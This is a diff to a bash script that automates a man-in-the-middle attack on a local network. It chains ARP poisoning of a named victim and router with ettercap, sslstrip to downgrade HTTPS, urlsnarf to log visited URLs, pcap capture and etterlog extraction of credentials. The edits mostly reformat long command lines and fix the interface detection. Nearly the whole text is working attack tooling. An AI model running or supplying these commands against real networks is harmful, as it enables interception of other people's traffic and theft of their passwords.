@@ -3,17 +3,17 @@
 #[ Description
 #|  Automatic MITM (arp poisoning) shell script that collects
 #|  all packets, including SSL traffic collected with sslstrip
-#[  and logs all the URLs using uslsnarf from dsniff collection.
+#|  and logs all the URLs using uslsnarf from dsniff collection.
 #
 #[ Requirements
 #|  sslstrip
 #|  dsniff
 #|  ettercap
-#[  iptables
+#|  iptables
 
-IFACES=$(ifconfig | grep '  $' | cut -d " " -f1)
+IFACES=$(ifconfig | grep 'UP' | cut -d':' -f1)
 
-echo -n "What interface to use? ie: "$IFACES":"
+echo -n "What interface to use? ie: "$IFACES": "
 read -e IFACE
 echo -n "Name of 'Session'? (name of the folder that will be created with all the log files): "
 read -e SESSION
@@ -32,7 +32,8 @@ sleep 1
 
 # Sslstrip
 echo "[+] Starting sslstrip..."
-xterm -geometry 75x15+1+200 -T sslstrip -e sslstrip -f -s -k -w /root/$SESSION/$SESSION.log &
+xterm -geometry 75x15+1+200 -T sslstrip -e \
+   sslstrip -f -s -k -w /root/$SESSION/$SESSION.log &
 sleep 2
 
 # urlsnarf
@@ -42,12 +43,14 @@ sleep 1
 
 
 # Ettercap
-echo
 echo "[+] Starting ettercap..."
-xterm -geometry 73x25+1+300 -T ettercap -s -sb -si +sk -sl 5000 -hold -e ettercap -Tq -P autoadd -i $IFACE -w /root/$SESSION/$SESSION.pcap -L /root/$SESSION/$SESSION -M arp:remote /"$ROUTER"/ /"$VICTIM"/ &
+xterm -geometry 73x25+1+300 -T ettercap -s -sb -si +sk -sl 5000 -hold -e \
+   ettercap -Tq -P autoadd -i $IFACE \
+      -w /root/$SESSION/$SESSION.pcap \
+      -L /root/$SESSION/$SESSION \
+      -M arp:remote /"$ROUTER"/ /"$VICTIM"/ &
 cat /proc/sys/net/ipv4/ip_forward
 iptables -t nat -L
-
 sleep 1
 
 echo
@@ -56,7 +59,7 @@ echo "After you have finished please close this script and clean up properly by 
 read WISH
 
 # Clean up
-if [ $WISH = "y" ] ; then
+if [[ $WISH = "y" ]]; then
    echo
    echo "[+] Cleaning up and resetting iptables..."
    killall sslstrip
@@ -71,7 +74,4 @@ if [ $WISH = "y" ] ; then
    etterlog -p -i /root/$SESSION/$SESSION.eci
 
    echo "[+] Clean up successful...Bye!"
-   exit
-
 fi
-exit
